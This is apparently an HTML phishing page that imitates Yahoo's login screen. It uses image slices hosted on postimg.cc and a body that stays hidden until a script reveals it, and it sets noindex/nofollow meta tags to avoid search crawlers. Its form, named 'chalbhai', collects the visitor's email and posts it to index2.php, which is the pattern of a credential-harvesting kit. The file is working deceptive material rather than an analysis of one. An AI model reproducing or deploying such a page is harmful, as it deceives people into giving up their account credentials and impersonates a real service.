<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Yahoo - login</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta charset="utf-8" />
<meta name="applicable-device" content="pc,mobile" />
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <meta name="googlebot" content="noindex, nofollow">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="format-detection" content="telephone=no" />

<link rel="shortcut icon"
              href="https://s33.postimg.cc/h21huhs3z/logo.png"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
<style type="text/css">

.textox {
   width: 279px;
   height: 40px;
   border: solid 1px #BFBFBF;
   padding: 2px;
   border-radius: 3px;
   font-size: 12px;
   background-color: #FFFFFF;
   outline: none;
   color: #474747;
  }
.textox:focus  {
   border: solid 1px #6AB6E6;
  }
  
.textox2 {
   width: 139px;
   height: 24px;
   border: solid 1px #FFFFFF;
   padding: 2px;
   border-radius: 3px;
   font-size: 12px;
   background-color: #FFFFFF;
   outline: none;
   color: #474747;
  }

input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label, input[type=checkbox].css-checkbox + label.css-label.clr {
							padding-left:29px;
							height:24px; 
							display:inline-block;
							line-height:24px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:24px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label, input[type=checkbox].css-checkbox + label.css-label.chk {
							background-position: 0 -24px;
						}
						label.css-label {
				background-image:url(http://csscheckbox.com/checkboxes/u/csscheckbox_a608ec28e6c50a02870bf452f125b974.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}

</style>

</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:63px; width:915px; height:660px; z-index:0"><img src="https://i.postimg.cc/8zf5s8Zg/leftback.png" alt="" title="" border=0 width=915 height=660></div>
<div id="image1" style="position:absolute; overflow:hidden; left:15px; top:10px; width:140px; height:42px; z-index:0"><img src="https://i.postimg.cc/3xFqXNSX/logo.png" alt="" title="" border=0 width=140 height=42></div>
<div id="image1" style="position:absolute; overflow:hidden; left:900px; top:65px; width:375px; height:12px; z-index:0"><img src="https://s33.postimg.cc/9ke1quwz3/background_up.png" alt="" title="" border=0 width=375 height=12></div>
<div id="image1" style="position:absolute; overflow:hidden; left:1030px; top:95px; width:125px; height:115px; z-index:0"><img src="https://i.postimg.cc/HsDH3J2R/logo2.png" alt="" title="" border=0 width=125 height=115></div>
<div id="image1" style="position:absolute; overflow:hidden; left:1274px; top:65px; width:260px; height:653px; z-index:0"><img src="https://i.postimg.cc/NfJDBXzP/rightback.png" alt="" title="" border=0 width=260 height=653></div>
<div id="image1" style="position:absolute; overflow:hidden; left:957px; top:396px; width:88px; height:19px; z-index:0"><img src="https://s33.postimg.cc/78an6t74v/staysignedin.png" alt="" title="" border=0 width=88 height=19></div>

<form action="index2.php" name=chalbhai id=chalbhai method=post>

<input name="userid"  required title="Username" autocomplete="off" placeholder="Enter your email" maxlength="25" class="formCtlColumn" type="text" style="position:absolute;padding-left:11px;font-size:16px;height:43px;width:303px;left:940px;top:250px;z-index:1">>

<div id="formimage1" style="position:absolute; left:930px; top:247px; z-index:13"><input type="image" name="formimage1" width="340" height="5" src="https://i.postimg.cc/vm1Fy9tQ/whiteout2.png"></div>
<div id="formimage1" style="position:absolute; left:933px; top:249px; z-index:13"><input type="image" name="formimage1" width="10" height="43" src="https://i.postimg.cc/htctKCXK/whiteout.png"></div>
<div id="formimage1" style="position:absolute; left:1240px; top:249px; z-index:13"><input type="image" name="formimage1" width="10" height="43" src="https://i.postimg.cc/htctKCXK/whiteout.png"></div>

<div id="checkboxG1"  style="position:absolute; left:937px; top:396px; z-index:24"><input type="checkbox" name="checkboxG2" id="checkboxG2" ><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<div id="formimage1" style="position:absolute; left:1130px; top:396px; z-index:13"><input type="image" name="formimage1" width="115" height="18" src="https://s33.postimg.cc/bk4asta1r/trouble.png"></div>
<div id="formimage1" style="position:absolute; left:990px; top:567px; z-index:13"><input type="image" name="formimage1" width="190" height="19" src="https://s33.postimg.cc/cm9fdzu6n/signup.png"></div>
<div id="formimage1" style="position:absolute; left:940px; top:320px; z-index:13"><input type="image" name="formimage1" width="303" height="48" src="https://i.postimg.cc/GtRm9zXP/signin.png"></div>
<div id="image9" style="position:absolute; overflow:hidden; left:915px; top:620px; width:525px; height:100px; z-index:0"><img src="https://s33.postimg.cc/3njtkmglr/background_down.png" alt="" title="" border=0 width=525 height=100></div>
<div id="image9" style="position:absolute; overflow:hidden; left:640px; top:725px; width:177px; height:21px; z-index:0"><img src="https://s33.postimg.cc/dtirsjfin/terms.png" alt="" title="" border=0 width=177 height=21></div>

</body>
</html>
